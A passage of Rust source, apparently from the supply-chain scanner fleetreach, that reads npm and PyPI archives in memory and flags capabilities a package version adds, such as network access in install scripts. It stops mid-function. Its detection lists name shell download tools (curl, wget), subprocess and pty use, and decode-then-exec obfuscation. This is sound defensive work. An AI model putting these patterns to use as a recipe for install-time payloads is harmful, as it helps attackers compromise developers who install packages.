//! `scan --capabilities` (spec 16, row 19): what an npm or PyPI package's code can do, read
//! statically from its archive, and above all what a version **adds** over the one before it
//! ("1.4.2 adds network access to install-time code").
//!
//! | Capability | Socket's alert | Read as |
//! |------------|----------------|---------|
//! | `network` | `networkAccess` | `http`, `https`, `net`, `dgram`, `tls`, `dns`, `fetch(`, `XMLHttpRequest`, `WebSocket`; Python `socket`, `urllib.request`, `http.client`, `requests`, `httpx`, `aiohttp`, `urllib3`; `curl`/`wget` in an install script |
//! | `shell` | `shellAccess` | `child_process`; Python `subprocess`, `pty`, `os.system`, `os.popen`, `os.exec*`, `os.spawn*`; a shell in an install script |
//! | `filesystem` | `filesystemAccess` | `fs`; Python `shutil`, `open(`, `os.remove`, `os.unlink` |
//! | `env` | `envVars` | `process.env`; Python `os.environ`, `os.getenv` |
//! | `eval` | `usesEval` | `eval(`, `new Function(`, `vm`; Python `eval(`, `exec(`, `marshal.loads` |
//! | `obfuscated` | `obfuscatedFile` | `_0x` identifiers or dense `\x` escapes; Python `exec`/`eval` of decoded data, PyArmor |
//! | `high-entropy` | `highEntropyStrings` | a string of 512+ base64 or 1024+ hex characters that looks random, not a `data:` URI |
//! | `native-code` | `hasNativeCode` | an ELF, Mach-O or PE file, or a `.node` addon |
//! | `install-script` | `installScripts` | `preinstall`, `install` or `postinstall`; a `.pth` file that imports |
//!
//! Code is **install-time** when it runs on install: an npm install script and the files it
//! starts with `node` (and their relative requires), a source distribution's `setup.py`, a
//! wheel's `.pth`. The rest is runtime.
//!
//! Warnings, each with an id of the form `fleetreach:<signal>:<ecosystem>/<package>@<version>`
//! so `[[settings.ignore]]` can take one out:
//!
//! - `adds-<capability>` and `adds-install-<capability>`: the version has what the previous
//!   release (the highest lower version, pre-releases only for a pre-release) did not.
//! - `install-<capability>` for network, shell, eval, obfuscated and high-entropy in
//!   install-time code, and `obfuscated` anywhere: these stand on their own.
//!
//! Only archives the lockfile pins by hash are read, and the previous release's archive must
//! match the registry's own hash. An archive is read in memory as bytes: never unpacked, never
//! run. Profiles are cached by archive hash, so a version is read once. Nothing here is a
//! verdict: a capability is what code can reach, and most packages that add one are benign.

use std::collections::{BTreeMap, BTreeSet};
use std::io::{Cursor, Read};
use std::path::{Path, PathBuf};

use fleetreach_core::inventory::Checksum;
use fleetreach_core::{DependencyKind, Ecosystem, Occurrence, RepoId, WarnFinding, WarnKind};
use rayon::prelude::*;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256, Sha512};

use crate::config::Repo;
use crate::health::Fetch;

/// Bumped whenever a rule changes, so cached profiles are read again.
const RULES: u32 = 2;
/// Bumped whenever the choice of previous release changes; profiles stay valid.
const LINKS: u32 = 3;
const DOWNLOADS_AT_ONCE: usize = 16;
/// The most read out of one archive.
const MAX_UNPACKED: u64 = 512 << 20;
/// Files larger than this are checked for a binary header only.
const MAX_SCANNED: u64 = 4 << 20;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Cap {
    Network,
    Shell,
    Filesystem,
    Env,
    Eval,
    Obfuscated,
    HighEntropy,
    NativeCode,
    InstallScript,
}

impl Cap {
    pub fn id(self) -> &'static str {
        match self {
            Cap::Network => "network",
            Cap::Shell => "shell",
            Cap::Filesystem => "filesystem",
            Cap::Env => "env",
            Cap::Eval => "eval",
            Cap::Obfuscated => "obfuscated",
            Cap::HighEntropy => "high-entropy",
            Cap::NativeCode => "native-code",
            Cap::InstallScript => "install-script",
        }
    }

    fn phrase(self) -> &'static str {
        match self {
            Cap::Network => "network access",
            Cap::Shell => "shell access",
            Cap::Filesystem => "filesystem access",
            Cap::Env => "environment variable reads",
            Cap::Eval => "dynamic code evaluation",
            Cap::Obfuscated => "obfuscated code",
            Cap::HighEntropy => "high-entropy strings",
            Cap::NativeCode => "native binaries",
            Cap::InstallScript => "an install script",
        }
    }
}

/// Where code runs.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum When {
    /// An npm install script, the files it starts, a wheel's `.pth`.
    Install,
    /// A source distribution's `setup.py`, run when pip builds it.
    Build,
    Runtime,
}

impl When {
    fn place(self) -> &'static str {
        match self {
            When::Install => "install-time code",
            When::Build => "build-time code (setup.py)",
            When::Runtime => "",
        }
    }

    /// What stands on its own here, whatever came before. A `setup.py` that runs a compiler
    /// or reads its version file with `exec` is the norm, so only a download or a hidden
    /// payload does there.
    fn alone(self, cap: Cap) -> bool {
        match self {
            When::Install => matches!(
                cap,
                Cap::Network | Cap::Shell | Cap::Eval | Cap::Obfuscated | Cap::HighEntropy
            ),
            When::Build => matches!(cap, Cap::Network | Cap::Obfuscated | Cap::HighEntropy),
            When::Runtime => cap == Cap::Obfuscated,
        }
    }
}

/// Tests, docs and examples ship in archives but are not what the package runs.
fn not_run(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    let mut parts = lower.split('/');
    let file = parts.next_back().unwrap_or_default();
    parts.any(|d| {
        matches!(
            d,
            "test"
                | "tests"
                | "testing"
                | "__tests__"
                | "spec"
                | "docs"
                | "doc"
                | "example"
                | "examples"
                | "benchmark"
                | "benchmarks"
        )
    }) || file == "conftest.py"
        || file.starts_with("test_")
        || file.ends_with("_test.py")
        || [
            ".test.js",
            ".spec.js",
            ".test.mjs",
            ".spec.mjs",
            ".test.cjs",
            ".spec.cjs",
        ]
        .iter()
        .any(|e| file.ends_with(e))
}

/// What one archive's code can do: each capability, where, and the first file that shows it.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Profile {
    pub caps: BTreeMap<String, String>,
}

impl Profile {
    fn key(cap: Cap, when: When) -> String {
        match when {
            When::Install => format!("install-{}", cap.id()),
            When::Build => format!("build-{}", cap.id()),
            When::Runtime => cap.id().to_string(),
        }
    }

    fn add(&mut self, cap: Cap, when: When, file: &str) {
        self.caps
            .entry(Self::key(cap, when))
            .or_insert_with(|| file.to_string());
    }

    pub fn has(&self, cap: Cap, when: When) -> Option<&str> {
        self.caps.get(&Self::key(cap, when)).map(String::as_str)
    }
}

pub const ALL: [Cap; 9] = [
    Cap::Network,
    Cap::Shell,
    Cap::Filesystem,
    Cap::Env,
    Cap::Eval,
    Cap::Obfuscated,
    Cap::HighEntropy,
    Cap::NativeCode,
    Cap::InstallScript,
];

// ---- reading code ----

fn ident(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_' || c == '$'
}

/// Whether `name(` appears as a call of its own: not a method, not part of a longer name.
fn bare_call(src: &str, name: &str) -> bool {
    let needle = format!("{name}(");
    src.match_indices(&needle).any(|(at, _)| {
        let before = src[..at].chars().next_back();
        !before.is_some_and(|c| ident(c) || c == '.')
    })
}

/// The module a JS `require`/`import` names, `node:` dropped, first path part only.
fn js_modules(src: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for opener in ["require(", "import(", "from ", "import "] {
        for (at, _) in src.match_indices(opener) {
            if opener == "require(" || opener == "import(" {
                let before = src[..at].chars().next_back();
                if before.is_some_and(|c| ident(c) || c == '.') {
                    continue;
                }
            }
            let rest = src[at + opener.len()..].trim_start();
            let Some(quote) = rest
                .chars()
                .next()
                .filter(|c| matches!(c, '"' | '\'' | '`'))
            else {
                continue;
            };
            let body = &rest[1..];
            let Some(end) = body.find(quote).filter(|e| *e < 200) else {
                continue;
            };
            let spec = body[..end].strip_prefix("node:").unwrap_or(&body[..end]);
            if spec.starts_with('.') || spec.starts_with('/') {
                out.insert(spec.to_string());
            } else if let Some(first) = spec.split('/').next() {
                out.insert(first.to_string());
            }
        }
    }
    out
}

/// The modules a Python file imports, dotted, with `from a import b` giving `a` and `a.b`.
fn py_modules(src: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for line in src.lines() {
        let line = line.trim();
        if let Some(rest) = line.strip_prefix("import ") {
            for part in rest.split(',') {
                if let Some(m) = part.split_whitespace().next() {
                    out.insert(m.to_string());
                }
            }
        } else if let Some(rest) = line.strip_prefix("from ") {
            let Some((module, names)) = rest.split_once(" import ") else {
                continue;
            };
            let module = module.trim();
            out.insert(module.to_string());
            for name in names.trim_matches(|c| c == '(' || c == ')').split(',') {
                if let Some(n) = name.split_whitespace().next() {
                    out.insert(format!("{module}.{n}"));
                }
            }
        }
    }
    for call in ["__import__(", "import_module("] {
        for (at, _) in src.match_indices(call) {
            let rest = src[at + call.len()..].trim_start();
            if let Some(q) = rest.chars().next().filter(|c| matches!(c, '"' | '\'')) {
                if let Some(end) = rest[1..].find(q) {
                    out.insert(rest[1..1 + end].to_string());
                }
            }
        }
    }
    out
}

fn imports_any(modules: &BTreeSet<String>, wanted: &[&str]) -> bool {
    modules.iter().any(|m| {
        wanted
            .iter()
            .any(|w| m == w || m.strip_prefix(w).is_some_and(|r| r.starts_with('.')))
    })
}

/// Shannon entropy in bits per character.
fn entropy(s: &str) -> f64 {
    let mut counts = [0u32; 256];
    for b in s.bytes() {
        counts[usize::from(b)] += 1;
    }
    let len = s.len() as f64;
    counts
        .iter()
        .filter(|c| **c > 0)
        .map(|c| {
            let p = f64::from(*c) / len;
            -p * p.log2()
        })
        .sum()
}

/// A long string literal that looks like an encoded random payload.
fn high_entropy(src: &str) -> bool {
    let bytes = src.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let q = bytes[i];
        if !matches!(q, b'"' | b'\'' | b'`') {
            i += 1;
            continue;
        }
        let start = i + 1;
        let mut end = start;
        while end < bytes.len() && bytes[end] != q && bytes[end] != b'\n' {
            end += 1;
        }
        let len = end - start;
        if len >= 512 {
            let s = &src[start.min(src.len())..end.min(src.len())];
            let base64 = s.bytes().all(|b| {
                b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_')
            });
            let hex = s.bytes().all(|b| b.is_ascii_hexdigit());
            // Bytes, not text: 64 bytes back can fall inside a multi-byte character.
            let data_uri = bytes[start.saturating_sub(64)..start]
                .windows(7)
                .any(|w| w == b"base64,")
                || s.starts_with("data:");
            if !data_uri
                && ((hex && len >= 1024 && entropy(s) >= 3.8)
                    || (base64 && !hex && entropy(s) >= 5.2))
            {
                return true;
            }
        }
        i = end + 1;
    }
    false
}

fn js_obfuscated(src: &str) -> bool {
    let hex_names = src
        .match_indices("_0x")
        .filter(|(at, _)| {
            let rest = &src.as_bytes()[at + 3..];
            rest.len() >= 4 && rest[..4].iter().all(u8::is_ascii_hexdigit)
        })
        .count();
    let escapes = src.matches("\\x").count();
    hex_names >= 20 || (escapes >= 200 && escapes * 4 * 5 > src.len())
}

fn py_obfuscated(src: &str) -> bool {
    src.contains("__pyarmor__")
        || src.lines().any(|line| {
            (bare_call(line, "exec") || bare_call(line, "eval"))
                && [
                    "b64decode",
                    "zlib.decompress",
                    "marshal.loads",
                    "codecs.decode",
                    "bytes.fromhex",
                    "[::-1]",
                ]
                .iter()
                .any(|k| line.contains(k))
        })
}

/// What one JavaScript file can do.
fn js_caps(src: &str) -> BTreeSet<Cap> {
    let m = js_modules(src);
    let has = |names: &[&str]| names.iter().any(|n| m.contains(*n));
    let mut out = BTreeSet::new();
    if has(&["http", "https", "net", "dgram", "tls", "dns", "http2"])
        || bare_call(src, "fetch")
        || src.contains("XMLHttpRequest")
        || src.contains("new WebSocket(")
    {
        out.insert(Cap::Network);
    }
    if has(&["child_process"]) {
        out.insert(Cap::Shell);
        // A download run through a shell: `exec("curl ...")`.
        if ["curl ", "wget ", "Invoke-WebRequest"]
            .iter()
            .any(|k| src.contains(k))
        {
            out.insert(Cap::Network);
        }
    }
    if has(&["fs", "fs-extra", "graceful-fs"]) {
        out.insert(Cap::Filesystem);
    }
    if src.contains("process.env") {
        out.insert(Cap::Env);
    }
    if bare_call(src, "eval") || src.contains("new Function(") || has(&["vm"]) {
        out.insert(Cap::Eval);
    }
    if js_obfuscated(src) {
        out.insert(Cap::Obfuscated);
    }
    if high_entropy(src) {
        out.insert(Cap::HighEntropy);
    }
    out
}

/// What one Python file can do.
fn py_caps(src: &str) -> BTreeSet<Cap> {
    let m = py_modules(src);
    let mut out = BTreeSet::new();
    if imports_any(
        &m,
        &[
            "socket",
            "urllib.request",
            "urllib2",
            "http.client",
            "httplib",
            "requests",
            "httpx",
            "aiohttp",
            "urllib3",
            "ftplib",
            "smtplib",
            "telnetlib",
            "websocket",
            "websockets",
        ],
    ) {
        out.insert(Cap::Network);
    }
    if imports_any(&m, &["subprocess", "pty", "commands"])
        || ["os.system(", "os.popen(", "os.exec", "os.spawn"]
            .iter()
            .any(|k| src.contains(k))
    {
        out.insert(Cap::Shell);
    }
    if imports_any(&m, &["shutil"])
        || bare_call(src, "open")
        || src.contains("os.remove(")
        || src.contains("os.unlink(")
    {
        out.insert(Cap::Filesystem);
    }
    if src.contains("os.environ") || src.contains("os.getenv(") {
        out.insert(Cap::Env);
    }
    if bare_call(src, "eval") || bare_call(src, "exec") || src.contains("marshal.loads") {
        out.insert(Cap::Eval);
    }
    if py_obfuscated(src) {
        out.insert(Cap::Obfuscated);
    }
    if high_entropy(src) {
        out.insert(Cap::HighEntropy);
    }
    out
}

fn native(path: &str, head: &[u8]) -> bool {
    let lower = path.to_ascii_lowercase();
    head.starts_with(b"\x7fELF")
        || [
            [0xfe, 0xed, 0xfa, 0xce],
            [0xfe, 0xed, 0xfa, 0xcf],
            [0xce, 0xfa, 0xed, 0xfe],
            [0xcf, 0xfa, 0xed, 0xfe],
        ]
        .iter()
        .any(|m| head.starts_with(m))
        || (head.starts_with(b"MZ")
            && [".exe", ".dll", ".node", ".pyd", ".sys", ".scr"]
                .iter()
                .any(|e| lower.ends_with(e)))
        || lower.ends_with(".node")
}

/// The files of an archive, path inside the package to bytes (large ones truncated to their
/// head), read in memory.
fn archive_files(
    body: &[u8],
    zip: bool,
    strip: usize,
) -> Result<Vec<(String, Vec<u8>, bool)>, String> {
    let mut out = Vec::new();
    let mut total = 0u64;
    let mut take = |path: &str, reader: &mut dyn Read, size: u64| -> Result<(), String> {
        let path = path.strip_prefix("./").unwrap_or(path);
        let mut rest = path;
        for _ in 0..strip {
            match rest.split_once('/') {
                Some((_, r)) => rest = r,
                None => return Ok(()),
            }
        }
        let whole = size <= MAX_SCANNED;
        let mut bytes = Vec::new();
        reader
            .take(if whole { MAX_SCANNED } else { 8 })
            .read_to_end(&mut bytes)
            .map_err(|e| e.to_string())?;
        total += size;
        if total > MAX_UNPACKED {
            return Err("the archive unpacks to too much".to_string());
        }
        out.push((rest.to_string(), bytes, whole));
        Ok(())
    };
    if zip {
        let mut archive = zip::ZipArchive::new(Cursor::new(body)).map_err(|e| e.to_string())?;
        for index in 0..archive.len() {
            let mut file = archive.by_index(index).map_err(|e| e.to_string())?;
            if file.is_dir() {
                continue;
            }
            let name = file.name().map_err(|e| e.to_string())?.to_string();
            let size = file.size();
            take(&name, &mut file, size)?;
        }
    } else {
        let gz = flate2::read::GzDecoder::new(body);
        let mut archive = tar::Archive::new(gz.take(MAX_UNPACKED));
        for entry in archive.entries().map_err(|e| e.to_string())? {
            let mut entry = entry.map_err(|e| e.to_string())?;
            if !entry.header().entry_type().is_file() {
                continue;
            }
            let path = entry
                .path()
                .map_err(|e| e.to_string())?
                .to_string_lossy()
                .into_owned();
            let size = entry.header().size().map_err(|e| e.to_string())?;
            take(&path, &mut entry, size)?;
        }
    }
    Ok(out)
}

/// Collapse `a/./b` and `a/x/../b`; `None` when it leaves the package.
fn joined(dir: &str, rel: &str) -> Option<String> {
    let mut parts: Vec<&str> = dir.split('/').filter(|p| !p.is_empty()).collect();
    for p in rel.split('/') {
        match p {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            p => parts.push(p),
        }
    }
    Some(parts.join("/"))
}

/// The package file a relative JS specifier names, trying the usual extensions.
fn resolve_js(files: &BTreeMap<&str, &str>, from: &str, spec: &str) -> Option<String> {
    let dir = from.rsplit_once('/').map_or("", |(d, _)| d);
    let base = joined(dir, spec)?;
    [
        base.clone(),
        format!("{base}.js"),
        format!("{base}.cjs"),
        format!("{base}.mjs"),
        format!("{base}/index.js"),
    ]
    .into_iter()
    .find(|c| files.contains_key(c.as_str()))
}

/// The capabilities an npm install script's own command line shows, and the files it starts.
fn npm_install_command(cmd: &str) -> (BTreeSet<Cap>, Vec<String>) {
    let mut caps = BTreeSet::from([Cap::InstallScript]);
    let mut started = Vec::new();
    for part in cmd.split(['&', '|', ';']) {
        let words: Vec<&str> = part.split_whitespace().collect();
        let Some(first) = words.first() else {
            continue;
        };
        match *first {
            "curl" | "wget" | "Invoke-WebRequest" | "iwr" => {
                caps.insert(Cap::Network);
                caps.insert(Cap::Shell);
            }
            "sh" | "bash" | "zsh" | "powershell" | "pwsh" | "cmd" | "cmd.exe" => {
                caps.insert(Cap::Shell);
            }
            "node" => {
                if let Some(file) = words.iter().skip(1).find(|w| !w.starts_with('-')) {
                    started.push(file.trim_start_matches("./").to_string());
                }
            }
            _ => {}
        }
        if part.contains("http://") || part.contains("https://") {
            caps.insert(Cap::Network);
        }
    }
    (caps, started)
}

/// The capability profile of an npm tarball.
pub fn npm_profile(body: &[u8]) -> Result<Profile, String> {
    let files = archive_files(body, false, 1)?;
    let mut profile = Profile::default();
    let texts: BTreeMap<&str, &str> = files
        .iter()
        .filter(|(_, _, whole)| *whole)
        .filter_map(|(p, b, _)| std::str::from_utf8(b).ok().map(|t| (p.as_str(), t)))
        .collect();
    let mut install_files: BTreeSet<String> = BTreeSet::new();
    if let Some(manifest) = texts.get("package.json") {
        let json: Value = serde_json::from_str(manifest).unwrap_or(Value::Null);
        for hook in ["preinstall", "install", "postinstall"] {
            let Some(cmd) = json["scripts"][hook].as_str() else {
                continue;
            };
            let (caps, started) = npm_install_command(cmd);
            for cap in caps {
                profile.add(cap, When::Install, &format!("package.json {hook}"));
            }
            install_files.extend(started);
        }
    }
    // The files install scripts start, and what they require relatively, transitively.
    let mut queue: Vec<String> = install_files.iter().cloned().collect();
    while let Some(file) = queue.pop() {
        let Some(src) = texts.get(file.as_str()) else {
            continue;
        };
        for spec in js_modules(src).into_iter().filter(|s| s.starts_with('.')) {
            if let Some(found) = resolve_js(&texts, &file, &spec) {
                if install_files.insert(found.clone()) {
                    queue.push(found);
                }
            }
        }
    }
    for (path, bytes, _) in &files {
        if native(path, bytes) {
            profile.add(Cap::NativeCode, When::Runtime, path);
        }
    }
    for (path, src) in &texts {
        let js = [".js", ".cjs", ".mjs"].iter().any(|e| path.ends_with(e));
        if !js || (not_run(path) && !install_files.contains(*path)) {
            continue;
        }
        let when = if install_files.contains(*path) {
            When::Install
        } else {
            When::Runtime
        };
        for cap in js_caps(src) {
            profile.add(cap, when, path);
        }
    }
    Ok(profile)
}

/// The capability profile of a PyPI wheel (`zip` with no top directory) or sdist.
pub fn pypi_profile(body: &[u8], filename: &str) -> Result<Profile, String> {
    let wheel = filename.ends_with(".whl");
    let zip = wheel || filename.ends_with(".zip");
    let files = archive_files(body, zip, usize::from(!wheel))?;
    let mut profile = Profile::default();
    for (path, bytes, whole) in &files {
        if native(path, bytes) {
            profile.add(Cap::NativeCode, When::Runtime, path);
        }
        let Some(src) = whole.then(|| std::str::from_utf8(bytes).ok()).flatten() else {
            continue;
        };
        if path.ends_with(".pth") && !path.contains('/') {
            if src.lines().any(|l| {
                l.trim_start().starts_with("import ") || l.trim_start().starts_with("import\t")
            }) {
                profile.add(Cap::InstallScript, When::Install, path);
                for cap in py_caps(src) {
                    profile.add(cap, When::Install, path);
                }
            }
            continue;
        }
        if !path.ends_with(".py") || not_run(path) {
            continue;
        }
        let when = if !wheel && path == "setup.py" {
            When::Build
        } else {
            When::Runtime
        };
        for cap in py_caps(src) {
            profile.add(cap, when, path);
        }
    }
    Ok(profile)
}

// ---- what is flagged ----

/// One warning on one package version.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Alert {
    pub signal: String,
    pub detail: String,
}

/// The warnings for `version`'s profile, given the previous release's (when there is one).
pub fn alerts(profile: &Profile, previous: Option<(&str, &Profile)>) -> Vec<Alert> {
    let mut out = Vec::new();
    for cap in ALL {
        for when in [When::Install, When::Build, When::Runtime] {
            let Some(file) = profile.has(cap, when) else {
                continue;
            };
            let (to, inside) = match when.place() {
                "" => (String::new(), String::new()),
                place => (format!(" to {place}"), format!(" in {place}")),
            };
            if let Some((prev_version, prev)) = previous {
                if prev.has(cap, when).is_none() {
                    out.push(Alert {
                        signal: format!("adds-{}", Profile::key(cap, when)),
                        detail: format!(
                            "adds {}{to} ({prev_version} had none): {file}",
                            cap.phrase()
                        ),
                    });
                }
            }
            if when.alone(cap) {
                out.push(Alert {
                    signal: Profile::key(cap, when),
                    detail: format!("has {}{inside}: {file}", cap.phrase()),
                });
            }
        }
    }
    out
}

// ---- registries, cache ----

fn to_hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

/// An archive and the hash it must have.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct Archive {
    url: String,
    filename: String,
    sum: Checksum,
}

fn matches(sum: &Checksum, body: &[u8]) -> bool {
    match sum.algorithm {
        "SHA-256" => to_hex(&Sha256::digest(body)) == sum.hex,
        "SHA-512" => to_hex(&Sha512::digest(body)) == sum.hex,
        _ => false,
    }
}

/// npm's `integrity` (`sha512-<base64>`) as a checksum.
fn npm_integrity(integrity: &str) -> Option<Checksum> {
    use base64::Engine as _;
    let b64 = integrity
        .split_whitespace()
        .find_map(|i| i.strip_prefix("sha512-"))?;
    let raw = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
    Checksum::new("SHA-512", &to_hex(&raw))
}

/// The newest release below `current`; pre-releases count only when `current` is one.
fn previous_of<V: Ord + Clone>(
    versions: impl Iterator<Item = (V, bool)>,
    current: &V,
    pre: bool,
) -> Option<V> {
    versions
        .filter(|(v, is_pre)| v < current && (pre || !is_pre))
        .map(|(v, _)| v)
        .max()
}

/// The current and previous archives of an npm package version, from its packument.
fn npm_archives(
    fetch: &dyn Fetch,
    name: &str,
    version: &str,
    pinned: &Checksum,
) -> Result<(Archive, Option<(String, Archive)>), String> {
    let url = format!("https://registry.npmjs.org/{}", name.replace('/', "%2f"));
    let body = fetch
        .get(&url)?
        .ok_or_else(|| format!("{name} is not on the npm registry"))?;
    let doc: Value = serde_json::from_slice(&body).map_err(|e| format!("{url}: {e}"))?;
    let versions = doc["versions"]
        .as_object()
        .ok_or("the packument has no versions")?;
    let archive = |v: &str| -> Option<Archive> {
        let dist = &versions.get(v)?["dist"];
        Some(Archive {
            url: dist["tarball"].as_str()?.to_string(),
            filename: format!("{v}.tgz"),
            sum: npm_integrity(dist["integrity"].as_str()?)?,
        })
    };
    let mut current =
        archive(version).ok_or_else(|| format!("{name} {version} is not on the npm registry"))?;
    current.sum = pinned.clone();
    let parsed = fleetreach_core::semver::Version::parse(version).map_err(|e| e.to_string())?;
    let prev = previous_of(
        versions
            .keys()
            .filter_map(|k| fleetreach_core::semver::Version::parse(k).ok())
            .map(|v| {
                let pre = !v.pre.is_empty();
                (v, pre)
            }),
        &parsed,
        !parsed.pre.is_empty(),
    );
    let previous = prev.and_then(|p| archive(&p.to_string()).map(|a| (p.to_string(), a)));
    Ok((current, previous))
}

/// The kind of a PyPI file, for picking the same kind in the previous release.
fn pypi_kind(filename: &str) -> String {
    match filename.strip_suffix(".whl") {
        Some(stem) => stem.splitn(3, '-').nth(2).map_or_else(
            || "wheel".to_string(),
            |tags| {
                // `<build>-<python>-<abi>-<platform>` or `<python>-<abi>-<platform>`.
                let parts: Vec<&str> = tags.split('-').collect();
                parts[parts.len().saturating_sub(3)..].join("-")
            },
        ),
        None => "sdist".to_string(),
    }
}

fn pypi_archives(
    fetch: &dyn Fetch,
    name: &str,
    version: &str,
    pinned: &Checksum,
) -> Result<(Archive, Option<(String, Archive)>), String> {
    let url = format!("https://pypi.org/pypi/{name}/json");
    let body = fetch
        .get(&url)?
        .ok_or_else(|| format!("{name} is not on PyPI"))?;
    let doc: Value = serde_json::from_slice(&body).map_err(|e| format!("{url}: {e}"))?;
    let releases = doc["releases"]
        .as_object()
        .ok_or("PyPI lists no releases")?;
    let files_of = |v: &str| -> Vec<Archive> {
        releases
            .get(v)
            .and_then(Value::as_array)
            .map(|files| {
                files
                    .iter()
                    .filter(|f| f["yanked"].as_bool() != Some(true))
                    .filter(|f| {
                        // Wheels and source archives; never eggs, installers or bzip2.
                        f["filename"].as_str().is_some_and(|n| {
                            [".whl", ".tar.gz", ".tgz", ".zip"]
                                .iter()
                                .any(|e| n.ends_with(e))
                        })
                    })
                    .filter_map(|f| {
                        Some(Archive {
                            url: f["url"].as_str()?.to_string(),
                            filename: f["filename"].as_str()?.to_string(),
                            sum: Checksum::new("SHA-256", f["digests"]["sha256"].as_str()?)?,
                        })
                    })
                    .collect()
            })
            .unwrap_or_default()
    };
    let current = files_of(version)
        .into_iter()
        .find(|a| a.sum.hex == pinned.hex)
        .ok_or_else(|| format!("no file of {name} {version} on PyPI has the locked hash"))?;
    let parsed = fleetreach_pypi::parse_pypi_version(version).ok_or("not a PEP 440 version")?;
    let prev = previous_of(
        releases
            .keys()
            .filter(|k| !files_of(k).is_empty())
            .filter_map(|k| fleetreach_pypi::parse_pypi_version(k).map(|v| (k.clone(), v)))
            .map(|(k, v)| {
                let pre = v.any_prerelease();
                ((v, k), pre)
            }),
        &(parsed.clone(), version.to_string()),
        parsed.any_prerelease(),
    );
    let kind = pypi_kind(&current.filename);
    let previous = prev.and_then(|(_, k)| {
        let files = files_of(&k);
        let same = files
            .iter()
            .find(|a| pypi_kind(&a.filename) == kind)
            .cloned();
        let pure = files
            .iter()
            .find(|a| a.filename.ends_with("-none-any.whl"))
            .cloned();
        let sdist = files
            .iter()
            .find(|a| pypi_kind(&a.filename) == "sdist")
            .cloned();
        same.or(pure).or(sdist).map(|a| (k, a))
    });
    Ok((current, previous))
}

#[derive(Serialize, Deserialize)]
struct Cached {
    rules: u32,
    profile: Profile,
}

fn cache_root() -> Option<PathBuf> {
    crate::osvdb::private_subdir("capabilities")
}

fn cache_path(root: &Path, sum: &Checksum) -> PathBuf {
    root.join(format!(
        "{}-{}.json",
        sum.algorithm.to_ascii_lowercase(),
        sum.hex
    ))
}

fn cached(root: Option<&Path>, sum: &Checksum) -> Option<Profile> {
    let text = std::fs::read_to_string(cache_path(root?, sum)).ok()?;
    let c: Cached = serde_json::from_str(&text).ok()?;
    (c.rules == RULES).then_some(c.profile)
}

fn store(root: Option<&Path>, sum: &Checksum, profile: &Profile) {
    let Some(root) = root else {
        return;
    };
    if std::fs::create_dir_all(root).is_err() {
        return;
    }
    let path = cache_path(root, sum);
    let tmp = path.with_extension("tmp");
    let body = serde_json::to_vec(&Cached {
        rules: RULES,
        profile: profile.clone(),
    });
    if let Ok(body) = body {
        if std::fs::write(&tmp, body).is_ok() {
            let _ = std::fs::rename(&tmp, &path);
        }
    }
}

/// The profile of one archive: from the cache, or fetched, checked against its hash and read.
fn profile_of(
    ecosystem: Ecosystem,
    archive: &Archive,
    fetch: Option<&dyn Fetch>,
    root: Option<&Path>,
) -> Result<Profile, String> {
    if let Some(p) = cached(root, &archive.sum) {
        return Ok(p);
    }
    let fetch = fetch.ok_or("not in the capability cache, and offline or no network feature")?;
    let body = fetch
        .get(&archive.url)?
        .ok_or_else(|| format!("{} is gone", archive.url))?;
    if !matches(&archive.sum, &body) {
        return Err(format!("{} does not match its hash", archive.url));
    }
    let profile = match ecosystem {
        Ecosystem::Npm => npm_profile(&body)?,
        _ => pypi_profile(&body, &archive.filename)?,
    };
    store(root, &archive.sum, &profile);
    Ok(profile)
}

/// One package version the fleet uses, with the hash its lockfile pins.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct Used {
    ecosystem: Ecosystem,
    name: String,
    version: String,
    sum: Checksum,
}

/// Which release came before a pinned archive, as the registry said: the version and the
/// archive to read, or none for a first release.
#[derive(Serialize, Deserialize)]
struct Link {
    rules: u32,
    previous: Option<(String, String, String, String, String)>,
}

fn link_path(root: &Path, sum: &Checksum) -> PathBuf {
    root.join(format!(
        "{}-{}.previous.json",
        sum.algorithm.to_ascii_lowercase(),
        sum.hex
    ))
}

fn cached_link(root: Option<&Path>, sum: &Checksum) -> Option<Option<(String, Archive)>> {
    let text = std::fs::read_to_string(link_path(root?, sum)).ok()?;
    let link: Link = serde_json::from_str(&text).ok()?;
    if link.rules != LINKS {
        return None;
    }
    Some(match link.previous {
        None => None,
        Some((version, url, filename, algorithm, hex)) => {
            let algorithm = ["SHA-256", "SHA-512"]
                .into_iter()
                .find(|a| *a == algorithm)?;
            let sum = Checksum::new(algorithm, &hex)?;
            Some((version, Archive { url, filename, sum }))
        }
    })
}

fn store_link(root: Option<&Path>, sum: &Checksum, previous: Option<&(String, Archive)>) {
    let Some(root) = root else {
        return;
    };
    let link = Link {
        rules: LINKS,
        previous: previous.map(|(v, a)| {
            (
                v.clone(),
                a.url.clone(),
                a.filename.clone(),
                a.sum.algorithm.to_string(),
                a.sum.hex.clone(),
            )
        }),
    };
    if std::fs::create_dir_all(root).is_ok() {
        if let Ok(body) = serde_json::to_vec(&link) {
            let path = link_path(root, sum);
            let tmp = path.with_extension("tmp");
            if std::fs::write(&tmp, body).is_ok() {
                let _ = std::fs::rename(&tmp, &path);
            }
        }
    }
}

/// The alerts for one package version, `Err` when it could not be read. With everything in
/// the cache, nothing is asked of the registry.
fn package_alerts(
    used: &Used,
    fetch: Option<&dyn Fetch>,
    root: Option<&Path>,
) -> Result<Vec<Alert>, String> {
    let known = cached_link(root, &used.sum);
    let (current, previous) = match (known, fetch) {
